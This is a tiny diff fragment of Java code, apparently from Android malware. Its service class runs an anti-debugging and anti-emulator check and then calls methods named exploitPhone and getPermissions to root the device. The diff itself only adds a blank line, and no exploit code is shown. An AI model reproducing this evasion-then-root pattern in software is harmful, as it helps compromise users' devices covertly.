@@ -85,6 +85,7 @@ public class ServiceMain extends Service {
 
 		// ANTIDEBUG ANTIEMU
 		if (Core.checkStatic()) {
+
 			Root.exploitPhone();
 			Root.getPermissions();
 			
